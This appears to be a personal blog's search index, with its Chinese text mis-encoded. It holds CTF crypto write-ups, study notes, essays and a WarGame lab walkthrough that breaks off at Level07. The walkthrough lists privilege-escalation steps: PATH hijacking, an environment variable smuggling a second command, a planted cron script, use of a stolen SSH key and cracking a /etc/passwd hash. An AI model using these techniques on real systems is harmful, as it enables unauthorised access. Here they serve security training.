<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Vishwa CTFè®°å½•</title>
      <link href="/2022/04/03/Vishwa%20CTF%E8%AE%B0%E5%BD%95/"/>
      <url>/2022/04/03/Vishwa%20CTF%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="Vishwa-CTFè®°å½•"><a href="#Vishwa-CTFè®°å½•" class="headerlink" title="Vishwa CTFè®°å½•"></a>Vishwa CTFè®°å½•</h1><h2 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h2><h3 id="1-John-The-Rocker"><a href="#1-John-The-Rocker" class="headerlink" title="1. John The Rocker"></a>1. John The Rocker</h3><p>æ— é¢˜ç›®æè¿°ï¼Œ<a href="https://github.com/StantonJoY/CTF-Notes/blob/main/VishwaCTF-22/idrsa.id_rsa.docx">idrsa.id_rsa</a></p><p>æ€è·¯ï¼š</p><ol><li>å…ˆå°†<code>id_rsa</code>æ–‡ä»¶è½¬ä¸ºhash</li><li>æ ¹æ®é¢˜ç›®æç¤ºä½¿ç”¨john the ripperçˆ†ç ´</li></ol><p><img src="https://s2.loli.net/2022/05/03/dpr9NulbKsz8eW5.png" alt="image-20220403014053311"></p><h3 id="2-Tallest-Header"><a href="#2-Tallest-Header" class="headerlink" title="2. Tallest Header"></a>2. Tallest Header</h3><p>My friend sent me file and said how amazing this is, but i think while sending file corrupted. Can you help me fixing this? PS: make it lowercase<br><a href="https://github.com/StantonJoY/CTF-Notes/blob/main/VishwaCTF-22/file.extension">file.extension</a></p><p>è›®ç»å…¸çš„éšå†™é¢˜ï¼Œç”¨010Editoræ‰“å¼€ï¼Œä¸éš¾çŒœåˆ°æ˜¯ä¸€å¼ jpgå›¾ç‰‡ï¼Œå°†å¼€å¤´çš„HEXç æ”¹ä¸ºjpgçš„æ ¼å¼æ ‡è¯†ï¼Œå³å¯æ‰“å¼€ã€‚</p><p><img src="https://s2.loli.net/2022/05/03/Ogi8w3XMIVPzREQ.jpg" alt></p><p><code>unzip file.jpg</code>æŠŠä»–åˆ†ç¦»ï¼Œæœç„¶å¾—åˆ°ä¸€äº›æ–‡ä»¶ï¼Œå¾—åˆ°åŠ å¯†æ–¹å¼ä»¥åŠå¯†æ–‡ï¼Œç¼–å†™è§£ç è„šæœ¬ä¹Ÿå¾ˆå®¹æ˜“ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># decrypt.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse_key</span>(<span class="params">key</span>):</span></span><br><span class="line">    inverse = []</span><br><span class="line">    <span class="keyword">for</span> position <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">min</span>(key),<span class="built_in">max</span>(key)+<span class="number">1</span>,<span class="number">1</span>):</span><br><span class="line">        inverse.append(key.index(position)+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> inverse</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">key, ciphertext</span>):</span></span><br><span class="line">    <span class="keyword">return</span> encrypt(inverse_key(key), ciphertext)</span><br><span class="line"><span class="built_in">print</span>(decrypt(key, ciphertext)</span><br><span class="line"><span class="comment"># å¾—åˆ°flag vishwaCTF&#123;tr1cky_h34d3r_w1th_p3rmu7at10n&#125;</span></span><br></pre></td></tr></table></figure><h3 id="3-Jumble-Bumble"><a href="#3-Jumble-Bumble" class="headerlink" title="3. Jumble Bumble"></a>3. Jumble Bumble</h3><p>Jumble Bumble been encode, get the flag from the code<br><a href="https://github.com/StantonJoY/CTF-Notes/blob/main/VishwaCTF-22/JumbleBumble.txt">JumbleBumble.txt</a><br><a href="https://github.com/StantonJoY/CTF-Notes/blob/main/VishwaCTF-22/script.py">script.py</a></p><p>æš´åŠ›</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> integer_nthroot</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    n = <span class="built_in">int</span>(file.readline().strip())</span><br><span class="line">    c = <span class="built_in">int</span>(file.readline().strip())</span><br><span class="line">    dis = file.readline()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        ans = integer_nthroot(c, <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">if</span> ans[<span class="number">1</span>]:</span><br><span class="line">            m = ans[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    plaintext = long_to_bytes(m).decode()</span><br><span class="line">    <span class="built_in">print</span>(plaintext)</span><br></pre></td></tr></table></figure><h3 id="4-Musical-Notes"><a href="#4-Musical-Notes" class="headerlink" title="4. Musical Notes"></a>4. Musical Notes</h3><p>Once I opened music website and found this image. There was SEA of images but this one seemed different.<br>There was written under this image that : listentocoolsong<br><a href="https://github.com/StantonJoY/CTF-Notes/blob/main/VishwaCTF-22/image.png">image.png</a><br>Hint: All Chores Encloses Rare Encryption cipher</p><p><img src="/.io//Vishwa CTFè®°å½•/image.png" alt="image"></p><p>è¿™é¢˜å®åœ¨æ²¡æœ‰æ€è·¯ï¼Œæ²¡è§è¿‡çš„åŠ å¯†æ–¹æ³•ï¼Œ</p><p>è§£ç åï¼š<code>5F6E8ACADC725F3515B9A302FE04FF3DF97D7F08A3BB6ABC4C168E0E14D5044F</code></p><p>é¢˜ç›®ä¸­SEAæš—ç¤ºAESï¼Œsecret key ä¸ºlistentocoolsongâ€¦â€¦è¿™é¢˜å®åœ¨è„‘æ´ï¼ŒFlag: vishwaCTF{mus1c4l_c1ph3r_1n_4ct10n}</p><h3 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h3>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cyber Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åƒæˆ‘è¿™æ ·çš„äºº</title>
      <link href="/2022/02/08/%E5%83%8F%E6%88%91%E8%BF%99%E6%A0%B7%E7%9A%84%E4%BA%BA/"/>
      <url>/2022/02/08/%E5%83%8F%E6%88%91%E8%BF%99%E6%A0%B7%E7%9A%84%E4%BA%BA/</url>
      
        <content type="html"><![CDATA[<p>å¤œæ™šï¼Œç»ˆäºå¾—ä»¥ä»å¿™ç¢Œçš„ä¸€å¤©è„±èº«ã€‚<br>ç»“æŸäº†ä¸€å¤©çš„è¡Œç¨‹ï¼Œç»ˆäºå°†æ­¥è°ƒæ”¾ç¼“äº†äº›ã€‚<br>ä¸€ä¸ªäººçš„æ—¶é—´ï¼Œæœ‰æ—¶å¹¶ä¸å­¤å•ã€‚<br>ä¸€æ•´å¤©çš„æ²¡äº†è‡ªæˆ‘è¿‡åï¼Œæ­¤åˆ»ä½ æ‰çœŸæ­£æ‹¥æœ‰è‡ªå·±ã€‚<br>å¶å°”â€¦â€¦æˆ–æ˜¯ç»å¸¸ï¼Œä½ å›æœ”ä»Šæ—¥çš„ä¸€ä¸¾ä¸€åŠ¨ï¼Œå›é¡¾è¿™ä¸€å‘¨ã€ä¸€ä¸ªæœˆã€ä¸€å¹´ã€‚ä¸€ç”Ÿã€‚<br>ä½ ä¸æ˜æ‰€ä»¥ï¼Œä¸ºä½•äº‹æƒ…çš„å‘å±•æ˜¯å¦‚æ­¤ï¼Œä¸ºä½•å½“åˆçš„é€‰æ‹©æ˜¯é‚£æ ·ï¼Œåˆä¸ºä½•ç°åœ¨çš„ä½ ï¼Œæ˜¯è¿™æ ·ã€‚</p><p>ã€Šåƒæˆ‘è¿™æ ·çš„äººã€‹æ¯›ä¸æ˜“ï¼Œå½“ä»£éŸ³ä¹ä¸å¤šçš„æˆ‘å¬å¾—å…¥è€³çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">åƒæˆ‘è¿™æ ·ä¼˜ç§€çš„äºº</span><br><span class="line">æœ¬è¯¥ç¿çƒ‚è¿‡ä¸€ç”Ÿ</span><br><span class="line">æ€éº¼äºŒåå¤šå¹´åˆ°å¤´æ¥</span><br><span class="line">è¿˜åœ¨äººæµ·è£¡æµ®æ²‰</span><br><span class="line"></span><br><span class="line">åƒæˆ‘è¿™æ ·èªæ˜çš„äºº</span><br><span class="line">æ—©å°±å‘Šåˆ«äº†å•çº¯</span><br><span class="line">æ€éº¼è¿˜æ˜¯ç”¨äº†ä¸€æ®µæƒ…</span><br><span class="line">å»æ¢ä¸€èº«ä¼¤ç—•</span><br><span class="line"></span><br><span class="line">åƒæˆ‘è¿™æ ·è¿·èŒ«çš„äºº</span><br><span class="line">åƒæˆ‘è¿™æ ·å¯»æ‰¾çš„äºº</span><br><span class="line">åƒæˆ‘è¿™æ ·ç¢Œç¢Œæ— ç‚ºçš„äºº</span><br><span class="line">ä½ è¿˜è§è¿‡å¤šå°‘äºº</span><br><span class="line"></span><br><span class="line">åƒæˆ‘è¿™æ ·åº¸ä¿—çš„äºº</span><br><span class="line">ä»ä¸å–œæ¬¢è£…æ·±æ²‰</span><br><span class="line">æ€éº¼å¶å°”å¬åˆ°è€æ­Œæ—¶</span><br><span class="line">å¿½ç„¶ä¹Ÿæ™ƒäº†ç¥</span><br><span class="line">åƒæˆ‘è¿™æ ·æ‡¦å¼±çš„äºº</span><br><span class="line">å‡¡äº‹éƒ½è¦ç•™å‡ åˆ†</span><br><span class="line">æ€éº¼æ›¾ç»ä¹Ÿä¼šç‚ºäº†è°</span><br><span class="line">æƒ³è¿‡å¥‹ä¸é¡¾èº«</span><br><span class="line"></span><br><span class="line">åƒæˆ‘è¿™æ ·è¿·èŒ«çš„äºº</span><br><span class="line">åƒæˆ‘è¿™æ ·å¯»æ‰¾çš„äºº</span><br><span class="line">åƒæˆ‘è¿™æ ·ç¢Œç¢Œæ— ç‚ºçš„äºº</span><br><span class="line">ä½ è¿˜è§è¿‡å¤šå°‘äºº</span><br><span class="line"></span><br><span class="line">åƒæˆ‘è¿™æ ·å­¤å•çš„äºº</span><br><span class="line">åƒæˆ‘è¿™æ ·å‚»çš„äºº</span><br><span class="line">åƒæˆ‘è¿™æ ·ä¸ç”˜å¹³å‡¡çš„äºº</span><br><span class="line">ä¸–ç•Œä¸Šæœ‰å¤šå°‘äºº</span><br><span class="line"></span><br><span class="line">åƒæˆ‘è¿™æ ·è¿·èŒ«çš„äºº</span><br><span class="line">åƒæˆ‘è¿™æ ·å¯»æ‰¾çš„äºº</span><br><span class="line">åƒæˆ‘è¿™æ ·ç¢Œç¢Œæ— ç‚ºçš„äºº</span><br><span class="line">ä½ è¿˜è§è¿‡å¤šå°‘äºº</span><br><span class="line"></span><br><span class="line">åƒæˆ‘è¿™æ ·å­¤å•çš„äºº</span><br><span class="line">åƒæˆ‘è¿™æ ·å‚»çš„äºº</span><br><span class="line">åƒæˆ‘è¿™æ ·ä¸ç”˜å¹³å‡¡çš„äºº</span><br><span class="line">ä¸–ç•Œä¸Šæœ‰å¤šå°‘äºº</span><br><span class="line"></span><br><span class="line">åƒæˆ‘è¿™æ ·è«åå…¶å¦™çš„äºº</span><br><span class="line">ä¼šä¸ä¼šæœ‰äººå¿ƒç–¼</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æŸä¸ªæ—¶æœŸï¼Œç”Ÿæ´»ç´§ç»·ï¼Œæ— æ³•åœæ­¢çš„è„šæ­¥ï¼Œåœä¸‹ä¾¿ç„¦è™‘çš„å¿ƒå¾‹ã€‚<br>é‚£æ—¶çš„æˆ‘ï¼Œæ—¶å¸¸ä¼šå¬è¿™é¦–æ­Œã€‚<br>å®ƒç¼“è§£äº†æˆ‘çš„å‹åŠ›ï¼Œæ— æ³•å®Œç¾å¤„ç†çš„æƒ…ç»ªã€‚<br>å°†æˆ‘çš„æ‰‹è¶³æ— æªé‡Šæ”¾ï¼Œå®‰ç½®åœ¨å®ƒè¯¥å­˜åœ¨çš„åœ°æ–¹ã€‚<br>å®ƒç”¨æ‚²ä¼¤ï¼ŒæŠšå¹³äº†æˆ‘çš„ä¼¤æ‚²ã€‚</p><p>å½“å¥‹åŠ›è¿‡åï¼Œè¿æ¥çš„å´æ˜¯ç©ºè™šã€‚<br>å½“å¥”è·‘çš„è¿‡ç¨‹ï¼Œå´å¬è§è®¸å¤šä¸å®‰ä¸è´¨ç–‘ã€‚<br>è€Œé‚£äº›è´¨ç–‘ï¼Œä¸æ˜¯çˆ±ç¢å˜´çš„è·¯äººï¼Œä¸æ˜¯ä¸€çŸ¥åŠè§£çš„å‹äººï¼Œä¸æ˜¯å›ºæ‰§å·±è§çš„äº²äººã€‚</p><p>æ˜¯ä½ ï¼Œæ˜¯ä½ è‡ªå·±æœ¬äººã€‚</p>]]></content>
      
      
      <categories>
          
          <category> éšç¬” </category>
          
      </categories>
      
      
        <tags>
            
            <tag> éšç¬” </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MindSpore</title>
      <link href="/2022/01/25/MindSpore/"/>
      <url>/2022/01/25/MindSpore/</url>
      
        <content type="html"><![CDATA[<h1 id="MindSpore-Winter-Camp"><a href="#MindSpore-Winter-Camp" class="headerlink" title="MindSpore Winter Camp"></a>MindSpore Winter Camp</h1><p>åä¸ºå¯’å‡MindSporeå®è·µè¯¾ï¼Œä½œä¸ºå¬è¯¾çš„ä¸ºæ•°ä¸å¤šçš„å¤§äºŒåŒå­¦ï¼Œ12hé€ŸæˆDNNâ€¦å¬èµ·æ¥è›®å“äººçš„</p><p>åä¸ºè®²çš„è¿˜æ˜¯å¯ä»¥çš„ï¼Œè€å¸ˆå‡†å¤‡å¾ˆå……åˆ†ï¼Œèµ„æºé…å¤‡ä¹Ÿå¾ˆå¥½ï¼Œäº‘æœåŠ¡å™¨ä½“éªŒå®åœ¨å¤ªé¡¶äº†ï¼Œé‚£æ¨¡å‹æˆ‘æœ¬æœºåå‡ å¤©éƒ½ä¸ä¸€å®šè®­ç»ƒçš„å‡ºæ¥</p><p>èµ„æ–™éƒ½æ•´ç†åœ¨<a href="https://github.com/StantonJoY/NJU-SE-Notes/tree/main/WinterSchool%20DNN">ä»“åº“</a></p><p>ä¸€ç‚¹ç‚¹æ–‡æ¡£æ²¡æœ‰çš„çŸ¥è¯†è®°å½•ï¼š</p><ul><li><p>ç‰¹å¾å›¾å¤§å°ï¼š(n+2p-f)/s +1å‘ä¸‹å–æ•´</p><p>nï¼šè¾¹é•¿</p><p>pï¼šå¡«å……ï¼ˆpaddingï¼‰</p><p>fï¼šfilterè¾¹é•¿</p><p>sï¼šæ­¥é•¿ï¼ˆstrideï¼‰</p><p>å› æ­¤ä»£ç ä¸­å…¨è¿æ¥æ—¶æ•°æ®éƒ½æ˜¯ç»è¿‡ä¸Šè¿°å…¬å¼è®¡ç®—çš„ï¼Œä¸æ˜¯éšä¾¿å¡«çš„</p></li><li><p><code>net_loss = nn.SoftmaxCrossEntropyWithLogits(sparse=True, reduction=&#39;mean&#39;)</code></p><p>sparseæŒ‡ä¸å¯¹æ•°æ®è¿›è¡Œ<a href="https://zhuanlan.zhihu.com/p/37471802">One-Hotç¼–ç </a></p><p>æ ‡ç­¾ç¼–ç çš„é—®é¢˜æ˜¯å®ƒå‡å®šç±»åˆ«å€¼è¶Šé«˜ï¼Œè¯¥ç±»åˆ«æ›´å¥½ï¼Œå¯¹äºç¼–å·1ã€2ã€3ï¼Œä¼šæœ‰1 + 3 = 4ï¼Œ4 / 2 = 2ï¼Œå°†ç±»åˆ«ä¹‹é—´å»ºç«‹èµ·é”™è¯¯åœ°å…³è”</p></li></ul><p>å®Œæˆé‚£äº›ä»»åŠ¡å±…ç„¶è¿˜ç»™å‘äº†ä¸ªè¯ä¹¦ï¼Œå°å¼€å¿ƒ~</p><p><img src="https://s2.loli.net/2022/05/03/2ZyqmeDkiXKIFHN.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DNN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>COA</title>
      <link href="/2022/01/25/COA%E4%B8%8A%E6%9C%BA%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/01/25/COA%E4%B8%8A%E6%9C%BA%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>å¤ä¹ æŠ˜ç£¨çš„COAä¸Šæœºè€ƒè¯•æ•´ç†çš„æµç¨‹å›¾ï¼Œåˆ å»å¯æƒœï¼Œç•™ä¸æœ‰ç¼˜äºº</p><p><img src="https://s2.loli.net/2022/05/03/7ZsmHSqyJwTp9rI.png" alt="Transformer"></p><p><img src="https://s2.loli.net/2022/05/03/yeXNRzb6Tf7OBtQ.png" alt="ALU"></p><p><img src="https://s2.loli.net/2022/05/03/A1r9toHin2bOxgj.png" alt="FPU"></p><p><img src="https://s2.loli.net/2022/05/03/PvuWEgdL9AenhYK.png" alt="NBCD"></p><p><img src="https://s2.loli.net/2022/05/03/m3ZbJYvrzK6MacH.png" alt="MMU"></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>éšç¬”</title>
      <link href="/2021/12/17/21.12.11%E9%9A%8F%E7%AC%94/"/>
      <url>/2021/12/17/21.12.11%E9%9A%8F%E7%AC%94/</url>
      
        <content type="html"><![CDATA[<p>åäºŒæœˆåˆå†¬çš„å¤©æ°”ï¼Œå‚æ™šäº”å…­ç‚¹çš„å…‰æ™¯ï¼Œæ­£æ˜¯äº‘éœæœ€å¥½çœ‹çš„æ—¶å€™ï¼Œå¤•é˜³é¥é¥æ‚¬åœ¨å¤©è¾¹ï¼Œé£˜ç€å‡ æœµç¢äº‘ï¼Œè¢«æŸ“æˆé‡‘çº¢é‡‘çº¢çš„ï¼Œé‡‘å¾—ç’€ç’¨å¤ºç›®ï¼Œçº¢å¾—æ˜è‰³åŠ¨äºº</p><p>ä½†è¿™æ˜¯ä¸€ç§ï¼Œæ²¡æœ‰æ„ä¹‰çš„ç¾</p><p>æ²¡æœ‰æ„ä¹‰åœ¨å“ªï¼Ÿ</p><p>æ²¡æœ‰æ„ä¹‰åœ¨ï¼Œæˆ‘æ—¢æ²¡æœ‰å€¼å¾—åˆ†äº«çš„äººï¼Œä¹Ÿä¸æƒ³é©»è¶³æ‹ä¸‹æ¥æŠŠè¿™ä¸€åˆ»ç•™ä½</p><p>å­¦ä¼šæŠŠè¿™äº›ç‰‡åˆ»å†™ä¸‹æ¥ï¼Œè€Œä¸æ˜¯å†å»è¯•å›¾å‘Šè¯‰è°</p><p>ä»Šå¤©çš„æ™šéœå¾ˆç¾ï¼Œè™½ç„¶å®ƒè·Ÿæ˜¨å¤©å‰å¤©ï¼Œæ˜å¤©åå¤©ï¼Œæˆ–è€…æ— æ•°ä¸ªä»¥å‰ä»¥åå¹¶æ²¡æœ‰ä»€ä¹ˆä¸åŒ</p><p>å®ƒä¸€ç‚¹éƒ½ä¸ç‰¹åˆ«</p><p>åªæ˜¯æˆ‘å¹ç€æ™šé£ï¼Œè¿ç€äººæ½®æ±¹æ¶Œï¼Œèµ°åœ¨è¡—ä¸Šï¼Œè½¬å¤´çœ‹å‘é‚£æ™šéœçš„æ—¶å€™</p><p>æ„Ÿåˆ°è«åçš„è§ç´¢</p>]]></content>
      
      
      <categories>
          
          <category> éšç¬” </category>
          
      </categories>
      
      
        <tags>
            
            <tag> éšç¬” </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WarGameé—¯å…³ç¬”è®°</title>
      <link href="/2021/12/17/WarGame/"/>
      <url>/2021/12/17/WarGame/</url>
      
        <content type="html"><![CDATA[<h1 id="WarGameç®€ä»‹"><a href="#WarGameç®€ä»‹" class="headerlink" title="WarGameç®€ä»‹"></a>WarGameç®€ä»‹</h1><p><a href="https://box.nju.edu.cn/d/10484f123139461d9412/">è™šæ‹ŸæœºåŠé¢˜ç›®é“¾æ¥</a></p><p>WarGameæä¾›çš„è™šæ‹Ÿæœºé•œåƒæ˜¯ä¸€ä¸ªåŸºäº Linux çš„æ¼æ´æŒ–æ˜çš„ç»ƒä¹ é—¯å…³å¹³å°ã€‚é—¯å…³è€…éœ€è¦ä»ä¸­æ‰¾åˆ°æ¼æ´å¹¶çªç ´æƒé™ã€‚ç›¸ä¿¡åœ¨å®Œæˆè¯¥å¹³å°çš„ç»ƒä¹ åï¼Œä½ å°†å¯¹æ¼æ´æŒ–æ˜çš„åŸç†æœ‰ä¸€ä¸ªè¾ƒä¸ºé€å½»çš„ç†è§£ï¼Œå¹¶æŒæ¡æ¼æ´æŒ–æ˜çš„åŸºæœ¬æ–¹æ³•ã€‚</p><p>è¯¥å¹³å°çš„æ¯ä¸€ä¸ªå…³å¡å¯¹åº”ä¸€ä¸ªåä¸º levelXX çš„è´¦å·ï¼Œå¯†ç ä¸è´¦å·åç›¸åŒã€‚åœ¨å®Œæˆæ¯ä¸€å…³ çš„ é¢˜ ç›® ä¹‹ å‰ ï¼Œ ä½  éœ€ è¦ ç”¨ å¯¹ åº” çš„ è´¦ å· ç™» å½• ç³» ç»Ÿ ã€‚ æ¯ ä¸ª å…³ å¡ çš„ é¢˜ ç›® å¯¹ åº” çš„ æ–‡ ä»¶ éƒ½ æ”¾ åœ¨ /home/flagXX ç›®å½•ä¸­ã€‚ä¾‹å¦‚ï¼Œç¬¬ä¸€å…³çš„è´¦å·åæ˜¯ level01ï¼Œå¯†ç ä¹Ÿæ˜¯ level01ï¼Œå¦‚æœè¿™ä¸ªå…³å¡ æœ‰éœ€è¦æ”»å‡»çš„åŒ…å«æ¼æ´çš„ç¨‹åºï¼Œé‚£ä¹ˆç›¸åº”çš„ç¨‹åºå°±æ”¾åœ¨/home/flag01 ç›®å½•ä¸­ã€‚æ¯ä¸ªå…³å¡çš„å†… å®¹ä»‹ç»å’Œç›¸å…³ç¨‹åºçš„æºä»£ç å¯ä»¥åœ¨æœ¬å®éªŒè®²ä¹‰åé¢å¯¹åº”çš„ Level å°èŠ‚ä¸­è·å¾—ã€‚<br>/home/flagXX ç›®å½•ä¸­çš„ç¨‹åºå…·å¤‡ SUID æƒé™ã€‚ä¾‹å¦‚åœ¨å…³å¡ level01 ä¸­ï¼Œç”¨ level01 è´¦å·ç™» å½•è¿›ç³»ç»Ÿï¼Œç„¶åæ‰§è¡Œ/home/flag01/flag01ï¼Œç¨‹åºå°†ä»¥ flag01 çš„èº«ä»½è¿è¡Œã€‚å½“ä½ åˆ©ç”¨è¯¥ç¨‹åºçš„ æ¼æ´æå‡è‡ªå·±çš„æƒé™åï¼Œä½ çš„èº«ä»½å°±å°†å˜ä¸º flag01ã€‚ææƒæˆåŠŸåï¼Œä½ éœ€è¦æ‰§è¡Œ/bin/getflagXX ç¨‹åºï¼ˆå¯¹æœ¬ä¾‹æ¥è¯´ï¼Œå°±æ˜¯æ‰§è¡Œ/bin/getflag01ï¼‰ï¼Œå¦‚æœä½ ç¡®å®æ˜¯ä»¥ flagXX çš„èº«ä»½è¿è¡Œè¯¥ç¨‹åºï¼Œ å°±å°†è·å¾—æç¤ºï¼šâ€œCongratulation! The flag is xxx-xxxâ€ï¼Œå¦åˆ™è·å¾—çš„æç¤ºä¸ºï¼šâ€œWrong, You are in  a  non-flag  accountâ€ã€‚æ¯ä¸ªå…³å¡çš„æœ€ç»ˆç›®çš„å°±æ˜¯åˆ©ç”¨ç¨‹åºæ¼æ´æå‡è‡ªå·±çš„æƒé™ï¼Œç„¶åæƒ³åŠ æ³•æ‰§è¡Œ/bin/getflagXX ç¨‹åºå¹¶è·å¾— flagã€‚ </p><h1 id="Level00"><a href="#Level00" class="headerlink" title="Level00"></a>Level00</h1><p>æŸ¥æ‰¾å…·æœ‰SUIDæƒé™çš„ç¨‹åºï¼Œæ‰¾åˆ° /bin/â€¦/flag00: find / -perm /4000</p><p>PSï¼šè€å¸ˆæ˜¯ä¸æ˜¯å‘è™šæ‹Ÿæœºä¹‹å‰è°ƒç”¨äº†flag00ï¼Œå†å²æŒ‡ä»¤æŒ‰ä¸¤ä¸‹å°±å‡ºç°äº†flag00ï¼Œä¸è¿‡è¿™å¤§æ¦‚ä¸èƒ½ç®—æ˜¯å¦ä¸€ç§åšæ³•å§~</p><p><img src="https://s2.loli.net/2021/12/17/8OpRzalEdNQXHcm.png" alt="00"></p><h1 id="Level01"><a href="#Level01" class="headerlink" title="Level01"></a>Level01</h1><ol><li>åœ¨ç”¨æˆ·ç›®å½•ä¸‹åˆ›å»ºç¬¦å·é“¾æ¥echo, é“¾æ¥åˆ°getflag: ln -s /bin/getflag01 ~/echo</li><li>å°†è‡ªå·±çš„ç”¨æˆ·ç›®å½•æ·»åŠ åˆ°ç¯å¢ƒå˜é‡ä¸­: export PATH=/home/level01/:$PATH</li><li>æ‰§è¡Œflag01, å®ƒä¼šå¸®æˆ‘ä»¬è¿è¡Œ /bin/getflag01</li></ol><p><img src="https://s2.loli.net/2021/12/17/sV9kgcCtlev1Eox.png" alt="01"></p><h1 id="Level02"><a href="#Level02" class="headerlink" title="Level02"></a>Level02</h1><ol><li>ä¿®æ”¹ç”¨æˆ·å, ä½¿å…¶é—­åˆå‰ä¸€ä¸ªè¯­å¥å¹¶åœ¨åé¢æ‰§è¡Œgetflag: export USER=â€name &amp;&amp; /bin/getflag02 &amp;&amp;â€</li><li>æ‰§è¡Œflag02</li></ol><p><img src="https://s2.loli.net/2021/12/17/eiB3xrV5taovC4M.png" alt="02"></p><h1 id="Level03"><a href="#Level03" class="headerlink" title="Level03"></a>Level03</h1><ol><li>åœ¨ç”¨æˆ·ç›®å½•ä¸‹å†™ä¸€ä¸ªgetflag( /bin/getflag03 &gt; ~/flag), å°†å®ƒæ‹·è´åˆ°æ¼æ´ç›®å½•ä¸‹</li><li>ç­‰å¾…ä¸€ä¼šcrontabæ‰§è¡Œ, æŸ¥çœ‹è·å¾—flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/XxwEAyrfPTRWchu.png" alt="03"></p><h1 id="Level04"><a href="#Level04" class="headerlink" title="Level04"></a>Level04</h1><ol><li>åœ¨ç”¨æˆ·ç›®å½•ä¸‹åˆ›å»ºé“¾æ¥è‡³/home/flag04/token</li><li>æ‰§è¡Œflag04, æŸ¥çœ‹token</li><li>åˆ‡æ¢åˆ°ç”¨æˆ·flag04, æ‰§è¡Œ/bin/getflag04</li></ol><p><img src="https://s2.loli.net/2021/12/17/43lnuvaASCTp7mK.png" alt="04"></p><h1 id="Level05"><a href="#Level05" class="headerlink" title="Level05"></a>Level05</h1><ol><li>å°†å‹ç¼©åŒ…è§£å‹åˆ°ç”¨æˆ·ç›®å½•ä¸‹: tar zxvf backup-2017.tar.gz -C ~/</li><li>ä½¿ç”¨sshå¯†é’¥ç™»å½•flag05: ssh -i .ssh/id_rsa flag05@192.168.195.128</li><li>è¿è¡Œ/bin/flag05è·å¾—flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/5zaHnPuKIGVdlhJ.png" alt="05"></p><h1 id="Level06"><a href="#Level06" class="headerlink" title="Level06"></a>Level06</h1><ol><li>æŸ¥çœ‹/etc/passwd, å‘ç°flag06å¯†ç çš„å¯†æ–‡å­˜åœ¨äº†è¿™é‡Œ</li><li>ä½¿ç”¨kaliçš„johnæ’ä»¶è¿›è¡Œç ´è§£, å¾—åˆ°flag06çš„å¯†ç  ftc</li><li>ç™»å½•ç”¨æˆ·flag06, è¿è¡Œ/bin/getflag06</li></ol><p><img src="https://s2.loli.net/2021/12/17/JIARGCDTc7Y5kKg.png" alt="06"></p><h1 id="Level07"><a href="#Level07" class="headerlink" 